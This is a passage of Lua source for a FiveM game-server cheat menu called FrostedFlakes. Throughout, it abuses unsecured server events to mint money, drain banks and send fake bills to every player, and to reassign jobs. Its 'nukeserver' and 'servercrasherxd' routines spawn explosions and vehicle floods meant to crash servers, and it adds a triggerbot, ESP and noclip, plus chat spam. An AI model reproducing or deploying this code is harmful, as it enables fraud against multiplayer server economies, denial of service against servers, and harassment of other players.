                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellOpium')
                        Citizen.Wait(1000)
                    end
                )
            end
            if blowall then
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'get fucked',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'get fucked'
                    )
                end
                for i = 0, 128 do
                    Citizen.Wait(500)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                end
            end
            if crosshair then
                ShowHudComponentThisFrame(14)
            end
            if crosshairc then
                bz('~r~+', 0.495, 0.484)
            end
            if crosshairc2 then
                bz('~r~.', 0.4968, 0.478)
            end
            if cN then
                local de = false
                local df = 130
                local dg = 0
                for f = 0, 128 do
                    if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(f)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if de then
                            if NetworkIsPlayerTalking(f) then
                                local dh = k(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    dh.r,
                                    dh.g,
                                    dh.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < df then
                            if not de then
                                if NetworkIsPlayerTalking(f) then
                                    local dh = k(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        dh.r,
                                        dh.g,
                                        dh.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end
            if showCoords then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                bz('~r~X:~s~ ' .. roundx, 0.05, 0.00)
                bz('~r~Y:~s~ ' .. roundy, 0.11, 0.00)
                bz('~r~Z:~s~ ' .. roundz, 0.17, 0.00)
            end

            function carthieftroll()
                for i = 0, 128 do
                    local bK = GetEntityCoords(GetPlayerPed(i))
                    TriggerServerEvent('esx_carthief:alertcops', bK.x, bK.y, bK.z)
                end
            end

            function automaticmoneyesx()
                local m = KeyboardInput('Warning, this value can be multiplied!!!', '', 100)
                if cO then
                    if m ~= '' then
                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                        if confirm == 'y' then
                        end
                        av('~h~~g~Testing all ~y~ESX ~g~scripts~s~.', true)
                        TriggerServerEvent('esx_carthief:pay', m)
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                        TriggerServerEvent('esx_carthief:pay', m)
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                        TriggerServerEvent('esx_pizza:pay', m)
                        TriggerServerEvent('esx_ranger:pay', m)
                        TriggerServerEvent('esx_garbagejob:pay', m)
                        TriggerServerEvent('esx_truckerjob:pay', m)
                        TriggerServerEvent('AdminMenu:giveBank', m)
                        TriggerServerEvent('AdminMenu:giveCash', m)
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                        TriggerServerEvent('esx_banksecurity:pay', m)
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    elseif confirm == 'n' then
                        av('~h~~b~Operation cancelled~s~.', false)
                    else
                        av('~h~~b~Invalid Confirmation~s~.', true)
                        av('~h~~b~Operation cancelled~s~.', false)
                    end
                end
            end

            function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'get fucked',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'get fucked'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit20,', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 128 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
            if bv then
                esxdestroyv2()
                nukeserver()
            end

            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'get fucked',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'get fucked'
                            )
                        end
                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                'get fucked',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
            end

            function giveeveryone()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                        end
                    end
                )
            end

            function nukeserver()
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'get fucked',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'get fucked'
                            )
                        end
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
                )
            end
            if servercrasherxd then
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        for i = 0, 128 do
                            for ak = 100, 150 do
                                local dl =
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
                            end
                        end
                    end
                )
            end
            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
            if TriggerBot then
                local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
                if dp then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end
            DisplayRadar(true)
            if RainbowVeh then
                local dq = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
            end
            if rainbowh then
                for i = -1, 12 do
                    Citizen.Wait(100)
                    local a8 = k(1.0)
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a8.r, a8.g, a8.b)
                    if i == 12 then
                        i = -1
                    end
                end
            end
            if t2x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            end
            if t4x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            end
            if t10x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
            end
            if t16x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            end
            if txd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
            end
            if tbxd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
            end
            if Noclip then
                local dr = 2
                local ds =
                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                    PlayerPedId(-1)
                FreezeEntityPosition(PlayerPedId(-1), true)
                SetEntityInvincible(PlayerPedId(-1), true)
                local dt = GetEntityCoords(entity)
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 268, true)
                DisableControlAction(0, 31, true)
                DisableControlAction(0, 269, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 266, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 30, true)
                DisableControlAction(0, 267, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 44, true)
                DisableControlAction(0, 20, true)
                local du = 0.0
                local dv = 0.0
                if GetInputMode() == 'MouseAndKeyboard' then
                    if IsDisabledControlPressed(0, 32) then
                        du = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        du = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        dv = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        dv = -0.21
                    end
                end
                dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.3), dv * (dr + 0.3))
                local bL = GetEntityHeading(ds)
                SetEntityVelocity(ds, 0.0, 0.0, 0.0)
                SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(ds, bL)
                SetEntityCollision(ds, false, false)
                SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true)
                FreezeEntityPosition(ds, false)
                SetEntityInvincible(ds, false)
                SetEntityCollision(ds, true, true)
            end
        end
    end
)
Citizen.CreateThread(
    function()
        FreezeEntityPosition(entity, false)
        local dw = 1
        local dx = true
        local dy = nil
        local dz = nil
        local dA = nil
        local dB = 1
        local dC = 1
        local dD = {
            1.0,
            2.0,
            4.0,
            10.0,
            512.0,
            9999.0
        }
        FrostedMenu.CreateMenu('FrostedFlakes', bs)
        FrostedMenu.SetSubTitle('FrostedFlakes', 'lilabyte x b00mek')
        FrostedMenu.CreateSubMenu('SelfMenu', 'FrostedFlakes', 'Self Menu')
		FrostedMenu.CreateSubMenu('BytemenuA', 'FrostedFlakes', 'Global Byte Menu')
		FrostedMenu.CreateSubMenu('B00mmenuA', 'FrostedFlakes', 'b00mek things')
        FrostedMenu.CreateSubMenu('TeleportMenu', 'FrostedFlakes', 'Teleport Menu')
        FrostedMenu.CreateSubMenu('WeaponMenu', 'FrostedFlakes', 'Weapon Menu')
        FrostedMenu.CreateSubMenu('AdvM', 'FrostedFlakes', 'Advanced Menu')
        FrostedMenu.CreateSubMenu('LuaMenu', 'FrostedFlakes', 'Lua Menu')
        FrostedMenu.CreateSubMenu('VehicleMenu', 'FrostedFlakes', 'Vehicle Menu')
        FrostedMenu.CreateSubMenu('OnlinePlayerMenu', 'FrostedFlakes', 'FrostedFlakes')
        FrostedMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
        FrostedMenu.CreateSubMenu('Destroyer', 'AdvM', 'Destroyer Menu')
        FrostedMenu.CreateSubMenu('ESXBoss', 'LuaMenu', 'ESX Boss Triggers')
        FrostedMenu.CreateSubMenu('ESXMoney', 'LuaMenu', 'ESX Money Triggers')
        FrostedMenu.CreateSubMenu('ESXDrugs', 'LuaMenu', 'ESX Drugs')
        FrostedMenu.CreateSubMenu('ESXCustom', 'LuaMenu', 'ESX Random Triggers')
        FrostedMenu.CreateSubMenu('VRPTriggers', 'LuaMenu', 'VRP Triggers')
        FrostedMenu.CreateSubMenu('MiscTriggers', 'LuaMenu', 'Misc Triggers')
        FrostedMenu.CreateSubMenu('crds', 'FrostedFlakes', 'Credits')
        FrostedMenu.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
        FrostedMenu.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', 'ESX Jobs Individual')
        FrostedMenu.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', 'ESX Triggers')
        FrostedMenu.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Menu')
        FrostedMenu.CreateSubMenu('Bytemenu', 'PlayerOptionsMenu', 'Byte-Menu')
        FrostedMenu.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
        FrostedMenu.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
        FrostedMenu.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
        FrostedMenu.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        FrostedMenu.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
        FrostedMenu.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        FrostedMenu.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
        FrostedMenu.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        FrostedMenu.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        FrostedMenu.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
        FrostedMenu.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
        FrostedMenu.CreateSubMenu('ESPMenu', 'AdvM', 'ESP Menu')
        FrostedMenu.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
        FrostedMenu.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        FrostedMenu.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
        FrostedMenu.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', 'VRP Triggers')
        FrostedMenu.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
        FrostedMenu.CreateSubMenu('SpawnPeds', 'Trollmenu', 'Spawn Peds')
        FrostedMenu.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
        FrostedMenu.CreateSubMenu('CsMenu', 'AdvM', 'Crosshairs')
		FrostedMenu.CreateSubMenu("VehicleRamMenu", "PlayerOptionsMenu", "Ram Vehicles Into Player")
        for i, dE in pairs(bl) do
            FrostedMenu.CreateSubMenu(dE.id, 'tunings', dE.name)
            if dE.id == 'paint' then
                FrostedMenu.CreateSubMenu('primary', dE.id, 'Primary Paint')
                FrostedMenu.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
                FrostedMenu.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
                FrostedMenu.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                FrostedMenu.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                FrostedMenu.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                FrostedMenu.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                FrostedMenu.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                FrostedMenu.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                FrostedMenu.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                FrostedMenu.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                FrostedMenu.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                FrostedMenu.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                FrostedMenu.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                FrostedMenu.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, dE in pairs(bm) do
            FrostedMenu.CreateSubMenu(dE.id, 'performance', dE.name)
        end
        local SelectedPlayer
        while bw do
            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh, 0)
            for i, dE in pairs(bl) do
                if FrostedMenu.IsMenuOpened('tunings') then
                    if bg then
                        if bi == 'neon' then
                            local r, g, b = table.unpack(bh)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            SetVehicleNeonLightEnabled(veh, 0, bk)
                            SetVehicleNeonLightEnabled(veh, 1, bk)
                            SetVehicleNeonLightEnabled(veh, 2, bk)
                            SetVehicleNeonLightEnabled(veh, 3, bk)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bi == 'paint' then
                            local dF, dG, dH, dI = table.unpack(bh)
                            SetVehicleColours(veh, dF, dG)
                            SetVehicleExtraColours(veh, dH, dI)
                            bg = false
                            bi = -1
                            bh = -1
                        else
                            if bk == 'rm' then
                                RemoveVehicleMod(veh, bi)
                                bg = false
                                bi = -1
                                bh = -1
                            else
                                SetVehicleMod(veh, bi, bh, false)
                                bg = false
                                bi = -1
                                bh = -1
                            end
                        end
                    end
                end
                if FrostedMenu.IsMenuOpened(dE.id) then
                    if dE.id == 'wheeltypes' then
                        if FrostedMenu.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif FrostedMenu.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif FrostedMenu.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif FrostedMenu.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif FrostedMenu.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif FrostedMenu.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif FrostedMenu.Button('High End Wheels') then
                            SetVehicleWheelType(veh, 7)
                        end
                        FrostedMenu.Display()
                    elseif dE.id == 'extra' then
                        local dJ = checkValidVehicleExtras()
                        for i, dE in pairs(dJ) do
                            if IsVehicleExtraTurnedOn(veh, i) then
                                pricestring = 'Installed'
                            else
                                pricestring = 'Not Installed'
                            end
                            if FrostedMenu.Button(dE.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        FrostedMenu.Display()
                    elseif dE.id == 'headlight' then
                        if FrostedMenu.Button('None') then
                            SetVehicleHeadlightsColour(veh, -1)
                        end
                        for dK, dE in pairs(bo) do
                            tp = GetVehicleHeadlightsColour(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Installed'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Previewing'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            head = GetVehicleHeadlightsColour(veh)
                            if FrostedMenu.Button(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleHeadlightsColour(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                elseif bg and head == dE.id then
                                    ToggleVehicleMod(veh, 22, true)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and head ~= dE.id then
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        FrostedMenu.Display()
                    elseif dE.id == 'licence' then
                        if FrostedMenu.Button('None') then
                            SetVehicleNumberPlateTextIndex(veh, 3)
                        end
                        for dK, dE in pairs(bn) do
                            tp = GetVehicleNumberPlateTextIndex(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Installed'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Previewing'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            plate = GetVehicleNumberPlateTextIndex(veh)
                            if FrostedMenu.Button(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleNumberPlateTextIndex(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                elseif bg and plate == dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and plate ~= dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        FrostedMenu.Display()
                    elseif dE.id == 'neon' then
                        if FrostedMenu.Button('None') then
                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
                            SetVehicleNeonLightEnabled(veh, 0, false)
                            SetVehicleNeonLightEnabled(veh, 1, false)
                            SetVehicleNeonLightEnabled(veh, 2, false)
                            SetVehicleNeonLightEnabled(veh, 3, false)
                        end
                        for i, dE in pairs(bq) do
                            colorr, colorg, colorb = table.unpack(dE)
                            r, g, b = GetVehicleNeonLightsColour(veh)
                            if
                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
                                    not bg
                             then
                                pricestring = 'Installed'
                            else
                                if bg and colorr == r and colorg == g and colorb == b then
                                    pricestring = 'Previewing'
                                else
                                    pricestring = 'Not Installed'
                                end
                            end
                            if FrostedMenu.Button(i, pricestring) then
                                if not bg then
                                    bi = 'neon'
                                    bk = IsVehicleNeonLightEnabled(veh, 1)
                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
                                    bh = table.pack(oldr, oldg, oldb)
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                elseif bg and colorr == r and colorg == g and colorb == b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and colorr ~= r or colorg ~= g or colorb ~= b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                end
                            end
                        end
                        FrostedMenu.Display()
